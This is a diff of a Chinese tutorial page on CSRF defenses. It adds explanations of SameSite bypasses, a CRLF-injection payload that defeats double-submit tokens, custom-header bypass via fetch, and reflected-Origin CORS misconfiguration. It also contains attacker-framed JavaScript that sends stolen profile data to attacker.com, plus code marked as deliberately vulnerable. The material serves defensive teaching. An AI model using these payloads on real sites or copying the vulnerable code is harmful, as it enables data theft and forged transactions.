@@ -588,7 +588,22 @@ fetch(&#39;https://admin.com/api/users&#39;, &#123;
 <p><code>Lax</code>：较宽松。允许顶级导航（用户主动点击链接跳转、地址栏直接输入 URL）携带 Cookie，但阻止 AJAX、<code>&lt;img&gt;</code>、<code>&lt;form&gt;</code> 等跨站请求携带。这是大多数场景的最佳选择——正常的链接跳转不受影响，但 CSRF 攻击常用的表单提交和图片标签无法携带 Cookie。</p>
 <p><code>None</code>：不限制。跨站请求也携带 Cookie，但必须同时设置 <code>Secure</code> 标志（仅 HTTPS 传输）。这是完全不做 CSRF 防护的状态。</p>
 <p><strong>SameSite=Lax 为什么能挡住大部分 CSRF？</strong> 因为 CSRF 攻击的核心是让浏览器在用户不知情的情况下发送跨站请求。<code>&lt;form&gt;</code> 自动提交、<code>&lt;img&gt;</code> 标签加载、<code>fetch</code> 跨域请求——这些都不是顶级导航，SameSite=Lax 下浏览器不会携带 Cookie。没有 Cookie，服务端就无法认证用户身份，CSRF 攻击自然失败。</p>
-<p><strong>局限性：</strong> SameSite 不是万能的。如果攻击者让用户在同站（same-site）上下文中触发请求（比如用户已经在 attacker.com 的子域下），SameSite 不起作用。另外，老版本浏览器（Chrome 80 以下、Safari 12 以下）不支持 SameSite，会回退到默认行为。</p>
+<p><strong>局限性：</strong> SameSite 不是万能的。老版本浏览器（Chrome 80 以下、Safari 12 以下）不支持 SameSite，会回退到默认行为。更本质的局限在于：SameSite 只拦截跨站请求，如果攻击者能在同站（same-site）上下文中触发请求，SameSite 完全不起作用。</p>
+<p><strong>同站上下文绕过 SameSite 的原理：</strong> 浏览器判断”同站”的标准是注册域（registrable domain），不是完整域名。<code>mail.bank.com</code> 和 <code>api.bank.com</code> 虽然子域不同，但注册域都是 <code>bank.com</code>，浏览器认为它们是同站。SameSite 对同站请求一律放行。</p>
+<p>攻击者有两种方式制造同站上下文。第一种，目标站自身存在 XSS。假设 <code>bank.com/search</code> 有存储型 XSS，攻击者注入了一段 JS。这段 JS 在 <code>bank.com</code> 的上下文中执行，它发起的 <code>fetch(&#39;/api/transfer&#39;, ...)</code> 对浏览器来说是同站请求（从 <code>bank.com</code> 到 <code>bank.com</code>）。SameSite Cookie 正常携带，CSRF Token 如果也被 XSS 读到了就能一起带上。第二种，子域被攻陷（子域接管）。假设 <code>bank.com</code> 有个子域 <code>old.bank.com</code> 指向一个过期的第三方服务，攻击者注册了那个服务，拿到了 <code>old.bank.com</code> 的控制权。浏览器认为 <code>old.bank.com</code> 和 <code>bank.com</code> 是同站（注册域都是 <code>bank.com</code>），攻击者在 <code>old.bank.com</code> 上放的表单提交到 <code>bank.com/api/transfer</code>，SameSite Cookie 正常携带。</p>
+<pre><code>正常 CSRF 攻击（被 SameSite 拦截）：
+  用户在 attacker.com 的页面上
+  → 表单提交到 bank.com/api/transfer
+  → 浏览器判断：attacker.com vs bank.com → 跨站
+  → SameSite=Lax 阻止携带 Cookie → 攻击失败
+
+XSS + CSRF 组合（SameSite 无法拦截）：
+  用户在 bank.com 的页面上（XSS 已注入）
+  → 恶意 JS 发起 fetch 到 bank.com/api/transfer
+  → 浏览器判断：bank.com vs bank.com → 同站
+  → SameSite 放行，Cookie 携带 → 攻击成功
+</code></pre>
+<p>所以 SameSite 防的是”从外部站点发起的跨站伪造请求”。如果攻击者已经能在目标站内部执行代码（XSS）或者在目标站的同站子域上放置内容（子域接管），SameSite 就没有用武之地。这也是为什么 CSRF 防御不能只靠 SameSite，需要纵深防御——XSS 防住了，SameSite 才不会被绕过。</p>
 <p><strong>浏览器默认行为变化：</strong> Chrome 80+ 开始，未显式设置 SameSite 的 Cookie 默认视为 <code>Lax</code>。这是一个重要的安全改进——即使开发者忘了设置 SameSite，浏览器也会提供基本的 CSRF 防护。但不能依赖这个默认行为，应该显式设置。</p>
 <h4 id="3-2-CSRF-Token：服务端校验的金标准"><a href="#3-2-CSRF-Token：服务端校验的金标准" class="headerlink" title="3.2 CSRF Token：服务端校验的金标准"></a>3.2 CSRF Token：服务端校验的金标准</h4><p>CSRF Token 的原理是：服务端为每个会话（或每个请求）生成一个随机、不可预测的令牌，嵌入到表单或页面中。提交请求时必须携带这个令牌，服务端校验令牌的有效性。攻击者无法获取这个令牌（受同源策略限制，跨域读不到页面内容），所以无法伪造有效请求。</p>
 <p><strong>同步令牌模式（Synchronizer Token Pattern）：</strong></p>
@@ -637,7 +652,30 @@ def transfer():
         abort(403, &#39;CSRF token mismatch&#39;)
 </code></pre>
 <p><strong>为什么这能防 CSRF？</strong> 因为跨站请求无法读取目标站的 Cookie（同源策略限制），攻击者不知道 <code>csrf_token</code> 的值，也就无法在 <code>X-CSRF-Token</code> 请求头中填入正确的值。服务端发现请求头中没有 Token 或 Token 不匹配，拒绝请求。</p>
-<p><strong>注意：</strong> 双重提交模式的安全性依赖于攻击者无法设置目标站的 Cookie。如果存在 Cookie 注入漏洞（如 CRLF 注入），攻击者可能伪造 Token。更安全的做法是服务端存储 Token 并校验（同步令牌模式）。</p>
+<p><strong>注意：</strong> 双重提交模式的安全性依赖于攻击者无法设置目标站的 Cookie。如果存在 Cookie 注入漏洞（如 CRLF 注入），攻击者可能伪造 Token。</p>
+<p><strong>CRLF 注入如何打破双重提交模式：</strong> CRLF 注入是指攻击者能在服务端的 HTTP 响应中注入换行符（<code>\r\n</code>），从而插入任意响应头。假设 <code>bank.com</code> 有个接口存在 CRLF 注入漏洞：</p>
+<pre><code class="python"># 危险：用户输入未经过滤直接放入响应头
+response.headers[&#39;Location&#39;] = request.args.get(&#39;url&#39;)
+</code></pre>
+<p>攻击者构造输入 <code>url=x\r\nSet-Cookie: csrf_token=known123\r\nAccess-Control-Allow-Origin: https://attacker.com\r\nAccess-Control-Allow-Credentials: true</code>，服务端返回的响应变成：</p>
+<pre><code>HTTP/1.1 302 Found
+Location: x
+Set-Cookie: csrf_token=known123; Path=/
+Access-Control-Allow-Origin: https://attacker.com
+Access-Control-Allow-Credentials: true
+</code></pre>
+<p>浏览器收到后，将 <code>bank.com</code> 的 <code>csrf_token</code> Cookie 覆盖为 <code>known123</code>（攻击者已知的值），同时允许 <code>attacker.com</code> 跨域读取响应并携带凭证。攻击者现在既知道 Token 的值，又能跨域读取 bank.com 的响应，双重提交模式完全失效。</p>
+<p><strong>为什么同步令牌模式不受影响？</strong> 同步令牌模式的校验逻辑不同：</p>
+<pre><code>双重提交模式：
+  校验 = Cookie 中的 Token == 请求头中的 Token
+  两者都在客户端，攻击者能同时控制两者 → 不安全
+
+同步令牌模式：
+  校验 = 请求中的 Token == 服务端 Session 中存储的 Token
+  一个在客户端，一个在服务端，攻击者只能控制客户端那个 → 安全
+</code></pre>
+<p>攻击者通过 CRLF 注入能控制 Cookie，但控制不了服务端的 Session。即使 Cookie 中的 <code>csrf_token</code> 被设为 <code>known123</code>，服务端 Session 中存的仍然是原始生成的随机值，两者不匹配，校验失败。</p>
+<p><strong>结论：</strong> 双重提交模式的安全性建立在”攻击者无法读写目标站 Cookie”这个假设上。CRLF 注入打破了这个假设。同步令牌模式不依赖这个假设——即使攻击者完全控制了客户端的所有数据，他仍然拿不到服务端 Session 中存储的 Token。这就是”服务端存储更安全”的含义。</p>
 <h4 id="3-3-自定义请求头：利用浏览器的跨域限制"><a href="#3-3-自定义请求头：利用浏览器的跨域限制" class="headerlink" title="3.3 自定义请求头：利用浏览器的跨域限制"></a>3.3 自定义请求头：利用浏览器的跨域限制</h4><p>对于前后端分离的 API，要求所有状态变更请求必须携带自定义请求头（如 <code>X-CSRF-Token</code>、<code>X-Requested-With</code>）：</p>
 <pre><code class="javascript">// 前端：所有 API 请求都带上自定义头
 fetch(&#39;/api/transfer&#39;, &#123;
@@ -658,7 +696,44 @@ def verify_csrf():
 </code></pre>
 <p><strong>为什么这能防 CSRF？</strong> HTML 表单只能发送 <code>application/x-www-form-urlencoded</code>、<code>multipart/form-data</code>、<code>text/plain</code> 三种 Content-Type，无法设置自定义请求头。<code>&lt;img&gt;</code>、<code>&lt;link&gt;</code> 等标签发起的请求也无法携带自定义头。所以，如果服务端要求必须有自定义头才能处理请求，传统的 CSRF 攻击手段（表单提交、图片标签）全部失效。</p>
 <p><strong>与 JSON Content-Type 配合：</strong> 如果服务端只接受 <code>application/json</code> 的 Content-Type，并且要求自定义请求头，攻击者需要同时绕过两个限制。HTML 表单无法发送 <code>application/json</code>，也无法设置自定义头，攻击面被大幅收窄。</p>
-<p><strong>局限性：</strong> 这个防御依赖于 CORS 配置正确。如果目标站的 CORS 允许跨域请求携带自定义头（<code>Access-Control-Allow-Headers: X-Requested-With</code>），攻击者可以通过 <code>fetch</code> 绕过。所以自定义头必须配合正确的 CORS 策略。</p>
+<p><strong>局限性：</strong> 这个防御依赖于 CORS 配置正确。自定义头只挡住了不会写 JS 的低级 CSRF 攻击（传统表单、图片标签）。会写 JS 的攻击者用 <code>fetch</code> 就能绕过自定义头，此时唯一能挡住他的是 CORS 策略。</p>
+<p><strong><code>fetch</code> 如何绕过自定义头防御：</strong> <code>fetch</code> API 能在请求中设置任意自定义头：</p>
+<pre><code class="javascript">// attacker.com 上的恶意代码
+fetch(&#39;https://bank.com/api/transfer&#39;, &#123;
+  method: &#39;POST&#39;,
+  credentials: &#39;include&#39;,
+  headers: &#123;
+    &#39;X-Requested-With&#39;: &#39;XMLHttpRequest&#39;,  // 想设就设
+    &#39;Content-Type&#39;: &#39;application/json&#39;
+  &#125;,
+  body: JSON.stringify(&#123; to: &#39;attacker&#39;, amount: 10000 &#125;)
+&#125;);
+</code></pre>
+<p>当 <code>fetch</code> 设置了自定义头（非简单头），浏览器会先发一个 OPTIONS 预检请求问服务端：”你允许 <code>attacker.com</code> 带 <code>X-Requested-With</code> 头发请求吗？”</p>
+<pre><code>→ OPTIONS /api/transfer HTTP/1.1
+→ Host: bank.com
+→ Origin: https://attacker.com
+→ Access-Control-Request-Method: POST
+→ Access-Control-Request-Headers: X-Requested-With, Content-Type
+
+← HTTP/1.1 204 No Content
+← Access-Control-Allow-Origin: https://attacker.com     ← 关键
+← Access-Control-Allow-Headers: X-Requested-With         ← 关键
+← Access-Control-Allow-Credentials: true                  ← 关键
+</code></pre>
+<p>如果服务端返回的 CORS 头中包含了 <code>Access-Control-Allow-Headers: X-Requested-With</code>，浏览器认为”bank.com 允许跨域请求带这个头”，于是放行真正的 POST 请求。攻击成功。如果服务端没有返回这个头（或者 <code>Allow-Origin</code> 没包含 <code>attacker.com</code>），浏览器直接拦截响应，攻击失败。</p>
+<p><strong>两层防御的叠加关系：</strong></p>
+<pre><code>第一层：自定义头校验
+  服务端要求请求必须有 X-Requested-With 头
+  → 挡住 &lt;form&gt;、&lt;img&gt;、&lt;link&gt; 等传统 CSRF 手段
+
+第二层：CORS 策略
+  浏览器对 fetch 的自定义头请求发 OPTIONS 预检
+  → 服务端必须在 CORS 响应中明确允许该头
+  → 如果 CORS 配置正确（不允许 attacker.com），fetch 也被挡住
+  → 如果 CORS 配置错误（允许了 attacker.com 或 *），fetch 绕过第一层
+</code></pre>
+<p>自定义头防御只挡住了传统 CSRF 手段。一旦攻击者用上 <code>fetch</code>，自定义头防御就失效了，此时只能靠 CORS 兜底。两层叠在一起才完整。</p>
 <h4 id="3-4-Referer-Origin-校验：简单但有效的辅助手段"><a href="#3-4-Referer-Origin-校验：简单但有效的辅助手段" class="headerlink" title="3.4 Referer / Origin 校验：简单但有效的辅助手段"></a>3.4 Referer / Origin 校验：简单但有效的辅助手段</h4><p>每个 HTTP 请求都带有 <code>Origin</code> 头（POST 请求）或 <code>Referer</code> 头，表明请求来源。服务端可以校验这些头是否来自本站：</p>
 <pre><code class="python">@app.before_request
 def verify_origin():
@@ -679,15 +754,65 @@ Access-Control-Allow-Credentials: true
 </code></pre>
 <p>这个组合在规范中是被禁止的——当 <code>Allow-Credentials: true</code> 时，<code>Allow-Origin</code> 不能为 <code>*</code>。但某些服务端框架可能不检查这个约束，导致浏览器在某些情况下仍然允许跨域携带 Cookie。</p>
 <p><strong>更危险的错误配置——动态反射 Origin：</strong></p>
+<p>有些开发者不想维护白名单，或者觉得白名单不够灵活（比如有多个前端域名：测试环境、预发布、生产环境），于是写了一个”省事”的逻辑——请求带什么 <code>Origin</code>，响应就原样返回什么 <code>Origin</code>：</p>
 <pre><code class="python"># 危险：将请求的 Origin 原样返回
 @app.after_request
 def add_cors(response):
     origin = request.headers.get(&#39;Origin&#39;, &#39;&#39;)
-    response.headers[&#39;Access-Control-Allow-Origin&#39;] = origin
-    response.headers[&#39;Access-Control-Allow-Credentials&#39;] = &#39;true&#39;
+    if origin:  # 只要有 Origin 头就反射回去
+        response.headers[&#39;Access-Control-Allow-Origin&#39;] = origin
+        response.headers[&#39;Access-Control-Allow-Credentials&#39;] = &#39;true&#39;
     return response
 </code></pre>
-<p>这等于对所有域开放 CORS，攻击者可以在自己的页面上用 <code>fetch</code> 携带用户的 Cookie 发请求，CSRF Token 和 SameSite Cookie 的防护都可能被绕过。</p>
+<p>这段代码的效果是：服务端对所有人都说”我允许你”。它没有 <code>*</code> 通配符的形式，但效果等同于 <code>*</code>。</p>
+<pre><code>attacker.com 发请求：
+  Origin: https://attacker.com
+  → 服务端返回 Access-Control-Allow-Origin: https://attacker.com
+  → 浏览器一看，允许！放行！
+
+evil.com 发请求：
+  Origin: https://evil.com
+  → 服务端返回 Access-Control-Allow-Origin: https://evil.com
+  → 浏览器一看，允许！放行！
+</code></pre>
+<p><strong>为什么开发者会写这种代码？</strong> 常见原因有三种。第一种，前后端分离项目有多个前端域名，不想逐个写死。第二种，开发者误以为 <code>Origin</code> 头是浏览器自动加的、用户不可控的，所以”反射 Origin”等于”只允许浏览器来的请求”。但 <code>Origin</code> 虽然由浏览器自动添加，攻击者完全可以选择从哪个域发起请求——他只需要在自己的域上放一段 JS 就行。第三种，开发者知道 <code>Allow-Origin: *</code> 不能和 <code>Allow-Credentials: true</code> 一起用（规范禁止），于是用”反射 Origin”来绕过这个限制。</p>
+<p><strong>攻击者怎么利用：</strong></p>
+<pre><code class="javascript">// 攻击者在 attacker.com 上放这段 JS
+fetch(&#39;https://bank.com/api/user/profile&#39;, &#123;
+  credentials: &#39;include&#39;  // 携带 bank.com 的 Cookie
+&#125;)
+.then(r =&gt; r.json())
+.then(data =&gt; &#123;
+  // 拿到了用户的个人信息、邮箱、手机号等
+  new Image().src = &#39;https://attacker.com/log?data=&#39; + JSON.stringify(data);
+&#125;);
+</code></pre>
+<pre><code>1. 攻击者的 JS 发起 fetch 到 bank.com
+2. 浏览器自动添加 Origin: https://attacker.com
+3. 浏览器发 OPTIONS 预检请求
+4. 服务端取出 Origin，原样返回
+   → Access-Control-Allow-Origin: https://attacker.com
+   → Access-Control-Allow-Credentials: true
+5. 浏览器检查：Allow-Origin 包含 attacker.com？是的。放行。
+6. 浏览器发送真正的 GET 请求，携带 bank.com 的 Cookie
+7. 服务端返回用户数据
+8. 攻击者的 JS 读取响应内容，数据泄露
+</code></pre>
+<p><strong>对比白名单做法：</strong></p>
+<pre><code class="python"># 安全：白名单控制
+ALLOWED_ORIGINS = &#123;&#39;https://mysite.com&#39;, &#39;https://admin.mysite.com&#39;&#125;
+
+@app.after_request
+def add_cors(response):
+    origin = request.headers.get(&#39;Origin&#39;, &#39;&#39;)
+    if origin in ALLOWED_ORIGINS:
+        response.headers[&#39;Access-Control-Allow-Origin&#39;] = origin
+        response.headers[&#39;Access-Control-Allow-Credentials&#39;] = &#39;true&#39;
+    # 不在白名单中 → 不返回 CORS 头 → 浏览器拦截响应
+    return response
+</code></pre>
+<p>同样的攻击请求，<code>Origin: https://attacker.com</code> 不在白名单中，服务端不返回 <code>Access-Control-Allow-Origin</code> 头，浏览器拦截响应，攻击者的 JS 读不到任何数据。</p>
+<p>动态反射 Origin 等于对所有域开放 CORS，攻击者可以在自己的页面上用 <code>fetch</code> 携带用户的 Cookie 发请求，CSRF Token 和 SameSite Cookie 的防护都可能被绕过。</p>
 <p><strong>正确配置：</strong></p>
 <pre><code class="python"># 安全：白名单控制允许的 Origin
 ALLOWED_ORIGINS = &#123;&#39;https://mysite.com&#39;, &#39;https://admin.mysite.com&#39;&#125;
